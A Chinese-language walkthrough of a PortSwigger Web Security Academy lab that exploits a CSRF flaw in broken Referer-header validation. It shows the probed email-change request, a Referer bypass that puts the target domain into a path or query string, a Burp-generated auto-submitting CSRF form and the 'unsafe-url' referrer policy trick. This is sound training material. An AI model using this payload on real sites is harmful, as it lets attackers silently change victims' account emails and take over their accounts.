# 实验：Referer 验证存在缺陷的 CSRF 漏洞

https://portswigger.net/web-security/csrf/bypassing-referer-based-defenses/lab-referer-validation-broken

本实验的邮箱修改功能易受 CSRF 攻击。它试图检测并阻止跨域请求，但该检测机制可以被绕过。

为了解决本实验，请使用你的漏洞利用服务器（exploit server）托管一个 HTML 页面，该页面利用 CSRF 攻击修改查看者的邮箱地址。

你可以使用以下凭据登录自己的账户：`wiener:peter`

> **提示**
> 你无法注册已被其他用户使用的邮箱地址。如果在测试利用程序时更改了自己的邮箱地址，请确保在向受害者交付最终利用程序时使用另一个不同的邮箱地址。

## 步骤

探测邮件修改功能
- 使用邮件修改功能
    ```http
    POST /my-account/change-email HTTP/2
    Cookie: session=YhXahJwUnxxarv9DzNvUg51HpIpCBXLh
    Origin: https://lab-id.web-security-academy.net
    Referer: https://lab-id.web-security-academy.net/my-account?id=wiener

    email=a%40b
    ```
    - 无 csrf 令牌

- 尝试删除 Referer 头部
    - 失败
- 尝试将目标域名设置为路径或查询参数
    ```http
    Referer: https://abc.com/lab-id.web-security-academy.net
    ```
    - 成功

攻击
- 使用 burp csrf poc 对邮件修改功能进行载荷构造
    ```html
    <html>
    <!-- CSRF PoC - generated by Burp Suite Professional -->
    <body>
        <form action="https://lab-id.web-security-academy.net/my-account/change-email" method="POST">
        <input type="hidden" name="email" value="a&#64;b" />
        <input type="submit" value="Submit request" />
        </form>
        <script>
        history.pushState('', '', '/');
        document.forms[0].submit();
        </script>
    </body>
    </html>
    ```
    - 设置或移除 `history.pushState('', '', '/');` （第三个参数将覆盖 URL）
        - 设置发送到受害者的 URL 包含目标域名为查询参数 `/?域名`
            - 虽然对攻击者账户测试时成功，但无法通过挑战
            - 查看攻击者服务器 log，发现受害者访问时自动在 URL 末尾添加 `/` 路径符号
        - 设置发送到受害者的 URL 包含目标域名为路径 `/域名/`
            - 成功
        - 设置 `history.pushState();` 使用 JS 修改当前 URL
            - 测试成功，并通过挑战

- 设置详细 referrer 头部 `unsafe-url`，以发送详细路径与查询参数
    - 客户端 HTML
        ```html
        <meta name="referrer" content="unsafe-url">
        ```
    - 服务器头部
        ```http
        Referrer-Policy: unsafe-url
        ```
